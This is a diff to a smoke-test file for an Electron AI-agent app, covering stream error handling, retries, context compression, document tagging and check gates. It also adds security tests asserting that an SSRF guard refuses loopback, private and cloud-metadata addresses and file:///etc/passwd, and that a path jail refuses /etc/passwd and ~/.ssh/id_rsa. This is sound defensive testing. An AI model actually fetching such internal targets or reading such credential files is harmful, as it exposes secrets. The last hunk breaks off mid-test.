@@ -115,6 +115,102 @@ app.whenReady().then(async () => {
   assert(typeof oc.chat === 'function' && typeof oc.listModels === 'function', 'openai-compat connector built for qwen');
   assert(typeof an.chat === 'function' && typeof an.listModels === 'function', 'anthropic connector built');
 
+  // ── Stream honesty: fake SSE server — error frames, truncation, retry ──
+  {
+    const http = require('node:http');
+    const { openaiCompat } = require('../src/main/providers/openai-compat');
+    const { anthropic: anthropicConn } = require('../src/main/providers/anthropic');
+    let handler = null;
+    const sse = http.createServer((req, res) => handler(req, res));
+    await new Promise((r) => sse.listen(0, '127.0.0.1', r));
+    const port = sse.address().port;
+    const ocLive = openaiCompat({ baseUrl: `http://127.0.0.1:${port}`, key: 'k' });
+    const anLive = anthropicConn({ baseUrl: `http://127.0.0.1:${port}`, key: 'k' });
+    const sseHead = (res) => res.writeHead(200, { 'Content-Type': 'text/event-stream' });
+    const chunk = (o) => `data: ${JSON.stringify(o)}\n\n`;
+
+    // 1. finish_reason 'length' → truncated surfaces (openai-compat, streaming)
+    handler = (req, res) => {
+      sseHead(res);
+      res.write(chunk({ choices: [{ delta: { content: 'partial tex' } }] }));
+      res.write(chunk({ choices: [{ delta: {}, finish_reason: 'length' }], usage: { prompt_tokens: 10, completion_tokens: 5 } }));
+      res.write('data: [DONE]\n\n');
+      res.end();
+    };
+    const trunc = await ocLive.chat({ model: 'm', messages: [{ role: 'user', content: 'hi' }], onDelta: () => {} });
+    assert(trunc.truncated === true && trunc.finishReason === 'length' && trunc.text === 'partial tex', 'stream: finish_reason length surfaces as truncated (openai-compat)');
+
+    // 2. In-stream error frame → the call FAILS (no partial-as-success)
+    handler = (req, res) => {
+      sseHead(res);
+      res.write(chunk({ choices: [{ delta: { content: 'half an ans' } }] }));
+      res.write(chunk({ error: { message: 'upstream exploded mid-stream' } }));
+      res.end();
+    };
+    let streamErr = null;
+    try { await ocLive.chat({ model: 'm', messages: [{ role: 'user', content: 'hi' }], onDelta: () => {} }); }
+    catch (e) { streamErr = e; }
+    assert(streamErr && /upstream exploded/.test(streamErr.message), 'stream: mid-stream error frame throws instead of returning partial text as success');
+
+    // 3. 429 then success → connect-phase retry recovers; retry is observable
+    let hits = 0; const retryEvents = [];
+    handler = (req, res) => {
+      hits++;
+      if (hits === 1) { res.writeHead(429, { 'Retry-After': '0' }); res.end('{"error":{"message":"rate limited"}}'); return; }
+      sseHead(res);
+      res.write(chunk({ choices: [{ delta: { content: 'ok after retry' } }] }));
+      res.write(chunk({ choices: [{ delta: {}, finish_reason: 'stop' }] }));
+      res.write('data: [DONE]\n\n');
+      res.end();
+    };
+    const retried = await ocLive.chat({ model: 'm', messages: [{ role: 'user', content: 'hi' }], onDelta: () => {}, onRetry: (r) => retryEvents.push(r) });
+    assert(retried.text === 'ok after retry' && !retried.truncated, 'stream: 429 at connect retries and succeeds');
+    assert(hits === 2 && retryEvents.length === 1 && retryEvents[0].status === 429, 'stream: the retry happened once and was reported via onRetry');
+
+    // 4. Non-retryable status (401) fails immediately — no blind retry loop
+    hits = 0;
+    handler = (req, res) => { hits++; res.writeHead(401); res.end('{"error":{"message":"bad key"}}'); };
+    let authErr = null;
+    try { await ocLive.chat({ model: 'm', messages: [{ role: 'user', content: 'hi' }], onDelta: () => {} }); } catch (e) { authErr = e; }
+    assert(authErr && hits === 1, 'stream: 401 is not retried');
+
+    // 5. Anthropic: stop_reason max_tokens via message_delta → truncated
+    handler = (req, res) => {
+      sseHead(res);
+      res.write(chunk({ type: 'message_start', message: { usage: { input_tokens: 9, output_tokens: 0 } } }));
+      res.write(chunk({ type: 'content_block_start', index: 0, content_block: { type: 'text' } }));
+      res.write(chunk({ type: 'content_block_delta', index: 0, delta: { type: 'text_delta', text: 'cut of' } }));
+      res.write(chunk({ type: 'message_delta', delta: { stop_reason: 'max_tokens' }, usage: { output_tokens: 5 } }));
+      res.write(chunk({ type: 'message_stop' }));
+      res.end();
+    };
+    const anTrunc = await anLive.chat({ model: 'm', messages: [{ role: 'user', content: 'hi' }], onDelta: () => {} });
+    assert(anTrunc.truncated === true && anTrunc.finishReason === 'max_tokens' && anTrunc.text === 'cut of', 'stream: anthropic stop_reason max_tokens surfaces as truncated');
+
+    // 6. Anthropic in-stream error event → throws
+    handler = (req, res) => {
+      sseHead(res);
+      res.write(chunk({ type: 'message_start', message: { usage: { input_tokens: 3 } } }));
+      res.write(chunk({ type: 'error', error: { type: 'overloaded_error', message: 'Overloaded' } }));
+      res.end();
+    };
+    let anErr = null;
+    try { await anLive.chat({ model: 'm', messages: [{ role: 'user', content: 'hi' }], onDelta: () => {} }); } catch (e) { anErr = e; }
+    assert(anErr && /Overloaded/.test(anErr.message), 'stream: anthropic error event throws instead of returning partial text');
+
+    // 7. chat-loop propagates truncation: flag on the result + a process event
+    const truncEvents = [];
+    const loopRes = await runChatLoop({
+      chat: async () => ({ text: 'short answer', toolCalls: [], truncated: true, finishReason: 'length' }),
+      callTool: async () => ({ text: 'x' }),
+      model: 'm', messages: [{ role: 'user', content: 'q' }],
+      onEvent: (e) => { if (e.kind === 'truncated') truncEvents.push(e); }
+    });
+    assert(loopRes.truncated === true && truncEvents.length === 1, 'chat-loop: truncation reaches the caller and the glass box');
+
+    sse.close();
+  }
+
   // MCP: repo (encrypted env, no-secret listing) + live stdio connect to fake server
   const srv = repo.mcp.add({ name: 'Fake', transport: 'stdio', command: 'node', args: [path.join(__dirname, 'fake-mcp-server.js')], secret: { env: { TOKEN: 'xyz' } } });
   const mlist = repo.mcp.list();
@@ -271,14 +367,6 @@ app.whenReady().then(async () => {
   const noCeilingNoPicksCapped = applyToolCeiling({ loadedSkills: [], toolNames: [], allTools: bigCatalog, fallbackCap: 5 });
   assert(noCeilingNoPicksCapped.tools.length === 5 && noCeilingNoPicksCapped.fellBack, 'tool ceiling still honors an explicit fallbackCap when one is passed');
 
-  // Planner: strategizes a request into steps + merge, then executes deterministically
-  const { makePlan, runPlan } = require('../src/main/planner');
-  const plan = await makePlan({ connector: { chat: async () => ({ text: '{"goal":"compare","steps":[{"task":"A","agent":"auto","parallel":true},{"task":"B","agent":"auto","parallel":true}],"merge":"compare A and B"}' }) }, model: 'm', request: 'compare A and B' });
-  assert(plan.steps.length === 2 && plan.steps[0].parallel && plan.merge === 'compare A and B', 'planner produces a structured, parallel plan');
-  const planConn = { chat: async ({ messages }) => { const u = (messages.find((m) => m.role === 'user') || {}).content || ''; return u.startsWith('You are merging') ? { text: 'MERGED' } : { text: 'C:' + u.slice(0, 6), toolCalls: [] }; } };
-  const planRun = await runPlan({ plan, connector: planConn, model: 'm', fastModel: 'm', resolveAgent: () => ({ agent: { name: 'general', system_prompt: 'x' }, model: 'm', tools: [] }), callTool: async () => ({ text: 'r' }), onEvent: () => {} });
-  assert(planRun.results.length === 2 && planRun.answer === 'MERGED', 'planner executes steps and AI-merges the results');
-
   // Orchestration: assign work in PARALLEL + merge the results (the full round-trip)
   const { runSubagent: rsa, mergeResults } = require('../src/main/subagent');
   const proc = [];
@@ -314,6 +402,10 @@ app.whenReady().then(async () => {
   assert(f2b.after < 200 && f2b.rules.includes('dedup-lines'), 'filter collapses runs of duplicate lines');
   const f3 = filterToolResult('noop', 'a short clean result');
   assert(f3.after === f3.before && f3.rules.length === 0, 'filter leaves small clean output untouched');
+  // ANSI: real escape sequences stripped; bracket-text like arr[m] or a literal
+  // "[0m" without the ESC byte is NOT touched (the regex must anchor on \x1b).
+  const fAnsi = filterToolResult('sh', '\x1b[31mred\x1b[0m arr[m] keeps [0m literal');
+  assert(fAnsi.text === 'red arr[m] keeps [0m literal', 'filter strips ANSI codes without corrupting bracket text');
   // Chat loop applies the filter to tool results
   let cstep = 0;
   const bigJson = JSON.stringify({ items: Array(400).fill({ a: 1, b: 2 }) }, null, 2);
@@ -381,6 +473,43 @@ app.whenReady().then(async () => {
   const small = await maybeCompress({ messages: [{ role: 'user', content: 'hi' }], contextWindow: 100000, summarize: async () => 'S' });
   assert(small.compressed === false, 'compression is skipped when under budget');
 
+  // Tool-pair-aware cut: a keepRecent boundary landing mid tool-exchange must
+  // walk back to a user message — an orphaned role:'tool' at the window start
+  // (its assistant tool_use parent summarized away) 400s on every provider.
+  {
+    const paired = [];
+    for (let i = 0; i < 6; i++) {
+      paired.push({ role: 'user', content: 'q'.repeat(3000) + i });
+      paired.push({ role: 'assistant', content: '', toolCalls: [{ id: 'tc' + i, name: 'lookup', args: {} }] });
+      paired.push({ role: 'tool', toolCallId: 'tc' + i, content: 'r'.repeat(3000) });
+      paired.push({ role: 'assistant', content: 'a'.repeat(3000) });
+    }
+    // keepRecent=3 would start the window on the tool/assistant tail of an exchange
+    const cutTest = await maybeCompress({ messages: paired, contextWindow: 1000, summarize: async () => 'SUM', keepRecent: 3 });
+    assert(cutTest.compressed === true, 'pair-aware compression still fires');
+    const firstKept = cutTest.messages.find((m) => m.role !== 'system');
+    assert(firstKept && firstKept.role === 'user', 'compression window starts on a user message (no orphaned tool result)');
+  }
+
+  // In-loop compact hook: runChatLoop applies it each iteration, so tool bulk
+  // accreting INSIDE a turn is defended, not just between turns.
+  {
+    let compactCalls = 0;
+    let step = 0;
+    const loopOut = await runChatLoop({
+      chat: async ({ messages }) => {
+        step++;
+        if (step === 1) return { text: '', toolCalls: [{ id: 't1', name: 'big', args: {} }] };
+        assert(messages.some((m) => m.content === 'COMPACTED'), 'in-loop compact output replaces the live history');
+        return { text: 'done', toolCalls: [] };
+      },
+      callTool: async () => ({ text: 'bulk' }),
+      model: 'm', messages: [{ role: 'user', content: 'go' }],
+      compact: async (h) => { compactCalls++; return step >= 1 ? [{ role: 'user', content: 'COMPACTED' }] : h; }
+    });
+    assert(loopOut.reply === 'done' && compactCalls >= 2, 'runChatLoop invokes the compact hook every iteration');
+  }
+
   // Chat management (rename + soft-delete)
   const cmProj = repo.projects.create({ name: 'ChatMgmt' });
   const cmChat = repo.chats.create({ projectId: cmProj.id, title: 'A' });
@@ -413,6 +542,13 @@ app.whenReady().then(async () => {
     // auto-capture id-like fields from a JSON tool RESULT; skip noise
     vs.captureFromResult('list_cases', JSON.stringify({ cases: [{ case_id: 'C-10432', account_id: 'A-88', label: 'noise' }] }), { step: 2 });
     assert(vs.get('account_id') === 'A-88' && !vs.has('label'), 'captureFromResult harvests id-like fields, skips noise');
+
+    // O16 harvest contract: PROSE results (merge digests, sub-agent
+    // conclusions) carry values in a trailing fenced json block.
+    vs.captureFromResult('group-fanout',
+      'The two periods show a 40% increase in cases.\n\nDetails follow.\n\n```json\n{"fingerprint_hash": "fp-9e77", "report_path": "/tmp/r.html"}\n```',
+      { step: 3 });
+    assert(vs.get('fingerprint_hash') === 'fp-9e77', 'captureFromResult harvests the fenced json block from prose conclusions (O16)');
 
     // render → the KNOWN VALUES block injected into the prompt
     const block = vs.render();
@@ -763,6 +899,12 @@ app.whenReady().then(async () => {
     const ambi = await ct.call('edit_file', { path: 'b.txt', old_string: 'dup', new_string: 'x' });
     assert(miss.isError && ambi.isError && ambi.text.includes('2 times'), 'coding: edit_file refuses missing and ambiguous matches');
 
+    // Regression: replacement text containing $-patterns ($&, $', $$) must be
+    // written literally — String.replace once interpreted them.
+    await ct.call('write_file', { path: 'dollar.txt', content: 'const re = PLACEHOLDER;\n' });
+    await ct.call('edit_file', { path: 'dollar.txt', old_string: 'PLACEHOLDER', new_string: `s.replace(/x/, '$&-$$')` });
+    assert(fs.readFileSync(path.join(work, 'dollar.txt'), 'utf8').includes(`s.replace(/x/, '$&-$$')`), 'coding: edit_file writes $-patterns literally (no replace-pattern expansion)');
+
     // Shell: cwd is the working dir; the app env is scrubbed (allowlist only).
     process.env.SMOKE_LEAK_CANARY = 'should-not-cross';
     const sh = await ct.call('run_command', { command: 'pwd; echo "C=${SMOKE_LEAK_CANARY:-unset}"' });
@@ -927,13 +1069,13 @@ app.whenReady().then(async () => {
 
     // Bootstrap: the full canonical set appears at docs/<NAME>.md, indexed.
     const created = projectDocs.ensureCanonicalDocs({ projectId: proj.id, docsBase: outDir });
-    assert(created.length === 4, 'O15: bootstrap creates all four canonical docs');
-    for (const t of ['SPEC', 'DESIGN', 'PSEUDOCODE', 'KNOWLEDGE']) {
+    assert(created.length === 5, 'O15: bootstrap creates all five canonical docs (incl. DEBT — O27)');
+    for (const t of ['SPEC', 'DESIGN', 'PSEUDOCODE', 'KNOWLEDGE', 'DEBT']) {
       assert(fs.existsSync(path.join(outDir, 'docs', `${t}.md`)), `O15: docs/${t}.md exists at its designed location`);
     }
     assert(fs.readFileSync(path.join(outDir, 'docs', 'SPEC.md'), 'utf8').includes('## Decision records'), 'O15: SPEC skeleton is structured, not an empty page');
     assert(projectDocs.ensureCanonicalDocs({ projectId: proj.id, docsBase: outDir }).length === 0, 'O15: bootstrap is idempotent — existing docs untouched');
-    assert(repo.documents.listByProject(proj.id).filter((d) => projectDocs.CANONICAL[d.doc_type]).length === 4, 'O15: all four indexed in the documents library');
+    assert(repo.documents.listByProject(proj.id).filter((d) => projectDocs.CANONICAL[d.doc_type]).length === 5, 'O15: all five indexed in the documents library');
 
     // Ratified decisions append to the SPEC as dated decision records.
     const w1 = projectDocs.appendDecisions({ projectId: proj.id, docsBase: outDir, records: [{ key: 'platform', value: 'react-native' }], goal: 'SIEM status app' });
@@ -994,17 +1136,90 @@ app.whenReady().then(async () => {
       model: 'mock', goal: 'add flag',
       stepResults: [{ step: 1, task: 'edit cli.js', conclusion: 'added --verbose' }],
       toolTrace: [{ name: 'edit_file', args: { path: 'cli.js' }, ok: true }, { name: 'run_command', args: { command: 'npm test' }, ok: true }],
-      known: 'KNOWN VALUES: x', current: { design: '# DESIGN old', pseudocode: '', knowledge: '# K' }
+      known: 'KNOWN VALUES: x', current: { design: '# DESIGN old', pseudocode: '', knowledge: '# K' },
+      files: [{ path: 'cli.js', content: 'module.exports = { runCli };' }]
     });
     assert(out.design === good && !out.knowledge && !out.pseudocode, 'doc-writer: valid docs pass, fragments rejected, untouched docs omitted');
     assert(seenPrompt.includes('technical writer') && seenPrompt.includes('Never narrate') && seenPrompt.includes('cli.js') && seenPrompt.includes('# DESIGN old'), 'doc-writer: prompt carries standards, files touched, and current docs');
+    // Regression: the files PARAM (changed-file contents) must reach the prompt —
+    // a shadowing bug once replaced it with bare path strings (### undefined blocks).
+    assert(seenPrompt.includes('### cli.js') && seenPrompt.includes('module.exports = { runCli };') && !seenPrompt.includes('### undefined'), 'doc-writer: changed-file CONTENTS reach the prompt (shadowing regression)');
     const none = await updateDocs({ connector: mock({ toolCalls: [{ id: 'x', name: 'submit_docs', args: { none: true, design: good } }] }), model: 'mock', current: {} });
     assert(Object.keys(none).length === 0, 'doc-writer: none=true wins — no writes');
     const fail = await updateDocs({ connector: { chat: async () => { throw new Error('boom'); } }, model: 'mock', current: {} });
     assert(Object.keys(fail).length === 0, 'doc-writer: model failure degrades to no-op, never degrades docs');
   }
 
-  // ── Record junk filter: decisions are short snake_case, never task prose ──
+  // ── Librarian (O26): faceted tags + deterministic filing validation ───────
+  {
+    const librarian = require('../src/main/librarian');
+    const libProj = repo.projects.create({ name: 'LibrarianProj' });
+
+    // repo.tags: slug is the dedupe key — spelling variants land on ONE tag.
+    const t1 = repo.tags.ensure(libProj.id, 'kind', 'Monthly Report');
+    const t2 = repo.tags.ensure(libProj.id, 'kind', 'monthly_report');
+    const t3 = repo.tags.ensure(libProj.id, 'kind', '  monthly-report  ');
+    assert(t1 && t2 && t3 && t1.id === t2.id && t2.id === t3.id, 'tags: spelling variants dedupe to one tag by slug');
+    assert(repo.tags.ensure(libProj.id, 'flavor', 'x') === null, 'tags: unknown facet refused');
+    assert(repo.tags.ensure(libProj.id, 'topic', '!!!') === null, 'tags: unsluggable name refused');
+
+    // Tag round-trips over documents and chats.
+    const libDoc = repo.documents.create({ projectId: libProj.id, title: 'August report', content: 'x', source: 'user' });
+    repo.tags.tagDocument(libDoc.id, t1.id);
+    repo.tags.tagDocument(libDoc.id, t1.id); // idempotent
+    assert(repo.tags.forDocument(libDoc.id).length === 1, 'tags: document tagging is idempotent');
+    const libChat = repo.chats.create({ projectId: libProj.id });
+    const tEnt = repo.tags.ensure(libProj.id, 'entity', 'Acme Corp');
+    repo.tags.tagChat(libChat.id, tEnt.id);
+    assert(repo.tags.forChat(libChat.id)[0].name === 'Acme Corp', 'tags: chat tagging round-trips');
+    repo.chats.setSummary(libChat.id, 'Investigated the acme phishing case.');
+    assert(repo.chats.get(libChat.id).summary.includes('phishing'), 'chats: session summary persists');
+    assert(repo.tags.listByProject(libProj.id).find((t) => t.id === t1.id).doc_count === 1, 'tags: vocabulary listing carries usage counts');
+
+    // validateTags: junk facets dropped, capped, deduped, existing spelling wins.
+    const existing = [{ facet: 'kind', slug: 'monthly-report', name: 'Monthly Report' }];
+    const vt = librarian.validateTags([
+      { facet: 'kind', name: 'monthly_report' },      // → existing spelling
+      { facet: 'flavor', name: 'junk' },              // unknown facet → dropped
+      { facet: 'topic', name: 'phishing' },
+      { facet: 'topic', name: 'Phishing' },           // dupe by slug → dropped
+      { facet: 'entity', name: 'acme' },
+      { facet: 'period', name: '2026-08' },
+      { facet: 'status', name: 'final' },
+      { facet: 'topic', name: 'overflow' }            // over cap → dropped
+    ], existing);
+    assert(vt.length === 5, 'librarian: tags capped at 5 after junk/dupe removal');
+    assert(vt[0].name === 'Monthly Report', 'librarian: existing vocabulary spelling wins over fresh coinage');
+    assert(!vt.some((t) => t.facet === 'flavor'), 'librarian: unknown facets dropped');
+
+    // fileDocument: mock connector — normalized type reuses vocabulary; junk output degrades to no-op.
+    const mockConn = (reply) => ({ chat: async () => reply });
+    const filed = await librarian.fileDocument({
+      connector: mockConn({ toolCalls: [{ id: 'x', name: 'file_document', args: { doc_type: 'Monthly_Report', entity: 'ACME corp', period: '2026-08', tags: [{ facet: 'kind', name: 'monthly_report' }] } }] }),
+      model: 'mock', meta: { title: 'August', type: 'report' },
+      vocabulary: { tags: existing, docTypes: ['monthly-report'], entities: ['Acme Corp'] }
+    });
+    assert(filed.docType === 'monthly-report' && filed.entity === 'Acme Corp' && filed.tags.length === 1, 'librarian: fileDocument normalizes type/entity to existing vocabulary');
+    const failed = await librarian.fileDocument({ connector: { chat: async () => { throw new Error('boom'); } }, model: 'mock', meta: {} });
+    assert(Array.isArray(failed.tags) && failed.tags.length === 0 && !failed.docType, 'librarian: filing failure degrades to saved-unfiled, never throws');
+
+    // fileSession: summary clipped to one line, tags validated the same way.
+    const sess = await librarian.fileSession({
+      connector: mockConn({ toolCalls: [{ id: 'x', name: 'file_session', args: { title: 'Acme phishing triage', summary: 'Triaged  the\nacme phishing case.', tags: [{ facet: 'entity', name: 'acme corp' }] } }] }),
+      model: 'mock', messages: [{ role: 'user', content: 'look at the acme case' }, { role: 'assistant', content: 'done' }],
+      vocabulary: { tags: [{ facet: 'entity', slug: 'acme-corp', name: 'Acme Corp' }] }
+    });
+    assert(sess.title === 'Acme phishing triage' && sess.summary === 'Triaged the acme phishing case.' && sess.tags[0].name === 'Acme Corp', 'librarian: fileSession returns title, one-line summary, vocabulary-preferring tags');
+
+    repo.projects.archive(libProj.id);
+  }
+
+  // ── Record junk filter: decisions are DIRECTIONS, never task prose ────────
+  // CONTRACT CHANGED (O8): this test previously asserted `Project Title` →
+  // `project_title` SURVIVES, which contradicted its own header and is exactly
+  // the junk that polluted a SPEC when driving a real turn. The filter now
+  // validates against a durable vocabulary, so a project title is dropped.
+  // The test was wrong, not the code — it is strengthened here, not weakened.
   {
     const { derivePlan } = require('../src/main/plan-derive');
     const mockChat = { chat: async () => ({ toolCalls: [{ id: 'p', name: 'submit_plan', args: { simple: true, goal: 'g', record: [
@@ -1013,7 +1228,7 @@ app.whenReady().then(async () => {
       { key: 'Project Title', value: 'x' }
     ] } }] }) };
     const p = await derivePlan({ connector: mockChat, model: 'mock', userText: 'u', tools: [], store: new VariableStore(), loadedSkills: [], agents: [] });
-    assert(p.record.length === 2 && p.record[0].key === 'platform' && p.record[1].key === 'project_title', 'record filter: long task-prose values dropped, keys normalized to snake_case');
+    assert(p.record.length === 1 && p.record[0].key === 'platform', 'record filter: only durable directions survive — task prose AND project titles dropped');
   }
 
   // ── Canonical-path migration: old bin rows re-pointed to docs/<NAME>.md ──
@@ -1086,6 +1301,43 @@ app.whenReady().then(async () => {
     const txt = htmlToText('<html><script>evil()</script><style>x{}</style><h1>Title</h1><p>Para &amp; more</p><li>item</li></html>');
     assert(!txt.includes('evil') && txt.includes('Title') && txt.includes('Para & more') && txt.includes('- item'), 'web: htmlToText strips scripts/styles, keeps structure');
     assert(unwrapDdg('//duckduckgo.com/l/?uddg=https%3A%2F%2Fa.b%2Fc') === 'https://a.b/c', 'web: uddg param decoded');
+
+    // SSRF guard: model-directed fetches must never reach loopback/private/
+    // link-local targets — by literal IP, by hostname, or via redirect hop.
+    const { isPrivateIp, assertPublicUrl } = require('../src/main/web-tools');
+    for (const ip of ['127.0.0.1', '10.0.0.5', '172.16.9.1', '172.31.255.1', '192.168.1.1', '169.254.169.254', '0.0.0.0', '::1', 'fc00::1', 'fe80::1', '::ffff:127.0.0.1']) {
+      assert(isPrivateIp(ip) === true, `web: ${ip} classified private`);
+    }
+    for (const ip of ['8.8.8.8', '172.32.0.1', '1.1.1.1', '2606:4700::1111']) {
+      assert(isPrivateIp(ip) === false, `web: ${ip} classified public`);
+    }
+    const refused = async (u) => { try { await assertPublicUrl(u); return false; } catch { return true; } };
+    assert(await refused('http://127.0.0.1:8080/admin'), 'web: loopback literal refused');
+    assert(await refused('http://localhost/x'), 'web: localhost refused');
+    assert(await refused('http://foo.internal/x'), 'web: .internal refused');
+    assert(await refused('file:///etc/passwd'), 'web: non-http scheme refused');
+    assert(await refused('http://[::1]/x'), 'web: v6 loopback literal refused');
+  }
+
+  // ── Documents-surface jail: index paths confined to managed roots ──────────
+  {
+    const { documentPathAllowed } = require('../src/main/ipc');
+    const jailWork = path.join(tmp, 'jaildocs-work');
+    fs.mkdirSync(jailWork, { recursive: true });
+    fs.mkdirSync(jailWork + '-evil', { recursive: true });
+    const jailBase = path.join(tmp, 'jaildocs-base');
+    fs.mkdirSync(jailBase, { recursive: true });
+    const prevBase = repo.settings.get('documents_base');
+    repo.settings.set('documents_base', jailBase);
+    const p = repo.projects.create({ name: 'JailDocs' });
+    repo.projects.setWorkingDir(p.id, jailWork);
+    assert(documentPathAllowed(path.join(jailWork, 'notes.md')) === true, 'docjail: working_dir path allowed');
+    assert(documentPathAllowed(path.join(jailBase, 'AnyProject', 'r.html')) === true, 'docjail: documents-base path allowed');
+    assert(documentPathAllowed('/etc/passwd') === false, 'docjail: /etc refused');
+    assert(documentPathAllowed(path.join(os.homedir(), '.ssh', 'id_rsa')) === false, 'docjail: ~/.ssh refused');
+    assert(documentPathAllowed(jailWork + '-evil/x') === false, 'docjail: sibling prefix (root-evil) refused');
+    repo.projects.archive(p.id);
+    repo.settings.set('documents_base', prevBase || null);
   }
 
   // ── Dev servers + build environment ───────────────────────────────────────
@@ -1140,6 +1392,516 @@ app.whenReady().then(async () => {
     assert(store.get('test_command') === 'npm run test:ci', 'facts: user-set value is not overwritten by observation');
 
     assert(facts.capture(store, { name: 'read_file', args: { path: 'a.js' }, text: 'x', ok: true }).length === 0, 'facts: non-command tools contribute nothing');
+  }
+
+  // ── O26–O30: rules → gates ring ─────────────────────────────────────────
+  // O26: the framework check gate — deterministic verdict, bounded fix step.
+  {
+    const { runCheckCommand } = require('../src/main/coding-tools');
+    const { executePlan } = require('../src/main/execute');
+    const { VariableStore } = require('../src/main/variables');
+    const wd = path.join(tmp, 'gate'); fs.mkdirSync(wd, { recursive: true });
+
+    const pass = await runCheckCommand(wd, 'exit 0');
+    const fail = await runCheckCommand(wd, 'echo FAIL_DETAIL; exit 1');
+    assert(pass.ok === true, 'O26: runCheckCommand exit 0 → ok');
+    assert(fail.ok === false && fail.output.includes('FAIL_DETAIL'), 'O26: a failing check is verbose — output tail returned');
+
+    // A mutating step whose check fails gets EXACTLY ONE inserted fix step;
+    // the fix step re-checks but can never insert another (no spiral).
+    let checkRuns = 0;
+    const checkStep = async () => { checkRuns++; return { ok: false, output: 'tests: 1 failing' }; };
+    const mutatingChat = async ({ messages }) => {
+      const last = messages[messages.length - 1];
+      if (String(last.content).includes('CURRENT STEP') || String(last.content).includes('check command FAILED')) {
+        if (!messages.some((m) => m.role === 'tool')) return { text: '', toolCalls: [{ id: 't1', name: 'write_file', args: { path: 'a.js', content: 'x' } }] };
+      }
+      return { text: 'done', toolCalls: [] };
+    };
+    const exec = await executePlan({
+      chat: mutatingChat, callTool: async () => ({ text: 'ok' }), model: 'm',
+      plan: { goal: 'g', steps: [{ id: 1, task: 'implement', agent: 'auto' }, { id: 2, task: 'unrelated', agent: 'auto' }] },
+      tools: [], store: new VariableStore(), history: [], checkStep
+    });
+    const fixResults = exec.stepResults.filter((r) => String(r.task).includes('check command FAILED'));
+    assert(fixResults.length === 1, 'O26: a failing check inserts exactly ONE fix step');
+    assert(checkRuns === 2, 'O26: the fix step re-checks; a still-failing check does not spiral');
+    assert(exec.completed && exec.stepResults.length === 3, 'O26: the plan still completes — the gate reports, it does not dead-end');
+
+    // A step that mutated nothing never triggers the check.
+    let quietRuns = 0;
+    await executePlan({
+      chat: async () => ({ text: 'done', toolCalls: [] }), callTool: async () => ({ text: 'ok' }), model: 'm',
+      plan: { goal: 'g', steps: [{ id: 1, task: 'read only', agent: 'auto' }, { id: 2, task: 'also read', agent: 'auto' }] },
+      tools: [], store: new VariableStore(), history: [], checkStep: async () => { quietRuns++; return { ok: true }; }
+    });
+    assert(quietRuns === 0, 'O26: non-mutating steps never pay for a check run');
+
+    // Review fix 5: a step that ran the check command itself, last and
+    // successfully, is already verified — the gate must not re-run it.
+    const { alreadyVerified } = require('../src/main/execute');
+    assert(alreadyVerified([{ name: 'edit_file', ok: true }, { name: 'run_command', args: { command: 'npm test' }, ok: true }], 'npm test') === true,
+      'O26: a step whose LAST action was the check itself is not re-checked');
+    assert(alreadyVerified([{ name: 'run_command', args: { command: 'npm test' }, ok: true }, { name: 'edit_file', ok: true }], 'npm test') === false,
+      'O26: a change AFTER the check invalidates it — the gate runs');
+    assert(alreadyVerified([{ name: 'run_command', args: { command: 'npm test' }, ok: false }], 'npm test') === false,
+      'O26: a FAILING self-run never counts as verified');
+    assert(alreadyVerified([{ name: 'run_command', args: { command: 'ls' }, ok: true }], 'npm test') === false,
+      'O26: an unrelated command is not the check');
+
+    let skipRuns = 0;
+    const selfChecking = async ({ messages }) => (messages.some((m) => m.role === 'tool')
+      ? { text: 'verified', toolCalls: [] }
+      : { text: '', toolCalls: [{ id: 'c1', name: 'run_command', args: { command: 'npm test' } }] });
+    await executePlan({
+      chat: selfChecking, callTool: async () => ({ text: 'ok' }), model: 'm',
+      plan: { goal: 'g', steps: [{ id: 1, task: 'verify', agent: 'auto' }] },
+      tools: [], store: new VariableStore(), history: [], checkCommand: 'npm test',
+      checkStep: async () => { skipRuns++; return { ok: true }; }
+    });
+    assert(skipRuns === 0, 'O26: the verify step running `npm test` itself is not billed a duplicate run');
+  }
+
+  // Glass box: a REFUSED working-memory write must not report as a capture.
+  // Observed live — a turn emitted five `var-set` events with key:null after
+  // the store rejected all five, so the rail showed captures that never
+  // happened (the same lie the record filter used to tell).
+  {
+    const { executeStep } = require('../src/main/execute');
+    const run = async (args) => {
+      const events = [];
+      let call = 0;
+      const chat = async () => (call++ === 0
+        ? { text: '', toolCalls: [{ id: 'v', name: 'set_variable', args }] }
+        : { text: 'done', toolCalls: [] });
+      await executeStep({
+        chat, callTool: async () => ({ text: 'ok' }), model: 'm', step: { id: 1, task: 't' },
+        tools: [], history: [], store: new VariableStore(), onEvent: (e) => events.push(e)
+      });
+      return events.filter((e) => e.type === 'process').map((e) => e.kind);
+    };
+    const refused = await run({ key: '', value: 'x' });
+    assert(refused.includes('var-rejected') && !refused.includes('var-set'), 'glass box: a refused set_variable reports var-rejected, never var-set');
+    const accepted = await run({ key: 'case_id', value: 'C-1' });
+    assert(accepted.includes('var-set') && !accepted.includes('var-rejected'), 'glass box: an accepted set_variable still reports var-set');
+  }
+
+  // O12: a stalled PROVIDER must not destroy the turn. Observed twice live —
+  // the connector's idle timer aborted mid-step and executeStep re-threw,
+  // losing every completed step, the synthesis, and the persistence.
+  {
+    const { executeStep, executePlan } = require('../src/main/execute');
+    const abortErr = () => { const e = new Error('This operation was aborted'); e.name = 'AbortError'; return e; };
+
+    const r = await executeStep({
+      chat: async () => { throw abortErr(); }, callTool: async () => ({ text: 'ok' }), model: 'm',
+      step: { id: 1, task: 't' }, tools: [], history: [], store: new VariableStore(), onEvent: () => {}
+    });
+    assert(r.stuck === true && r.reason === 'provider-timeout', 'O12: a provider idle-timeout degrades the step to STUCK, it does not throw');
+    assert(r.aborted !== true, 'O12: a provider timeout is NOT reported as a user STOP');
+
+    // A user STOP still takes its own path (not misread as a provider stall).
+    const s = await executeStep({
+      chat: async () => { throw abortErr(); }, callTool: async () => ({ text: 'ok' }), model: 'm',
+      step: { id: 1, task: 't' }, tools: [], history: [], store: new VariableStore(),
+      isAborted: () => true, onEvent: () => {}
+    });
+    assert(s.aborted === true && s.stuck === false, 'O12: a user STOP is still a STOP, not a provider timeout');
+
+    // The whole turn survives: step 1 completes, step 2 stalls, and step 1's
+    // result is still there for synthesis instead of being lost to a throw.
+    let n = 0;
+    const exec = await executePlan({
+      chat: async () => { n += 1; if (n === 1) return { text: 'step one done', toolCalls: [] }; throw abortErr(); },
+      callTool: async () => ({ text: 'ok' }), model: 'm',
+      plan: { goal: 'g', steps: [{ id: 1, task: 'a' }, { id: 2, task: 'b' }] },
